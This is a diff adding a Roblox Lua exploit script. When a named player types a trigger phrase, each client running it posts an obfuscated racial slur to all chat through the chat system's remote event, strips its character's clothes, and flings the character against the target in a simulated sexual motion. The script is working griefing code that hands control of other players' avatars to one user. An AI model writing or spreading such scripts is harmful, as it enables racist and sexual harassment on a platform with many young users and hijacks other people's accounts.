@@ -1,0 +1,30 @@
+local targetPlayerName = "valmaralt9"
+local targetPhrase = ":benx ."
+
+game.Players[targetPlayerName].Chatted:connect(function(cht)
+    if cht:match(targetPhrase) then
+        if game.Players.LocalPlayer ~= game.Players[targetPlayerName] then
+            wait(0)
+            local A_1 = "ƒυçκ αλλ ŋïɠɠαš"
+            local A_2 = "All"
+            local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+            Event:FireServer(A_1, A_2)
+            game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = game.Players.LocalPlayer.Character.HumanoidRootPart
+
+            local benxed = true
+            while benxed == true do
+                local hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
+                pcall(function()
+                    hummy.Parent.Pants:Destroy()
+                end)
+                pcall(function()
+                    hummy.Parent.Shirt:Destroy()
+                end)
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[targetPlayerName].Character.HumanoidRootPart.CFrame + game.Players[targetPlayerName].Character.HumanoidRootPart.CFrame.lookVector * 0.5
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+                wait(0.1)
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+            end
+        end
+    end
+end)
